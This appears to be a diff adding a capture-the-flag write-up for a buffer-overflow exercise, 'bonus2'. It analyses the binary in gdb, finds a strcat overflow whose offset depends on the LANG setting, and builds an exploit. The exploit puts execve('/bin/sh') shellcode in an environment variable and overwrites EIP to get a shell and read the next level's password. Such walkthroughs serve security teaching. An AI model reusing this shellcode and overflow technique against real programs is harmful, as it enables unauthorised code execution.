@@ -1,0 +1,49 @@
+bonus2 does nothing with 0 or 1 arguments, and if called with 2 arguments, prints
+"Hello [first argument]".
+
+Inspecting it with gdb, we find out:
+-there's 1 global variable called language
+-there's 1 main function (obviously)
+-there's a function called greetuser
+
+The global variable, language, is initialised at 0. The main returns 1 if there isn't 
+exactly 2 arguments.
+It stores the first argument in a buffer, and the second argument in a second buffer.
+It then does a getenv, searching for the value of "LANG" in the environment. If the value is
+"nl" or "fi", it changes the value of the language Gvar to reflect that.
+
+Then it calls [greetuser] on the first argument. The function has a buffer of 88. Depending on
+the value of language, it will strcpy "Hello ", "Goedemiddag! " or "Hyvää päivää " to the buffer,
+then strcat the program's first argument to the buffer. It will then print it with puts.
+
+The strcat in greetuser might be where we can overflow the buffer. First let's try to find the offset,
+like in all previous exercises. I'll use the same string as previously.
+
+(gdb) >r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Segfault message
+at 0x08006241
+
+Hmm. It doesn't look like it works. Actually, the 6241 part seems like a part of our test string, but the 0800 part...
+Actually when you look at the whole program's code, it seems obvious. The language we're using is the default language, so
+the buffer contains "Hello ". Maybe if we change the language to one of the other two, it will work better.
+
+> export LANG = "fi"
+
+(gdb) >r [same thing as before] [same]
+Segfault message
+at 0x41366141
+
+Better. 0x41366141 means the offset of EIP is at 18. Now we can build a payload.
+Just like with bonus 0, let's store the payload in an env variable and find its address.
+
+>export SHELLCODE = $(python -c "print '\x90'*90 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
+>/tmp/getenv
+0xbffff8a3
+
+Now we know what to give as args to our program.
+
+>./bonus2 $(python -c "print 'X'*40") $(python -c "print 'X'*18 + '\xa3\xf8\xff\xbf'")
+$>cd ../bonus3
+$>cat .pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
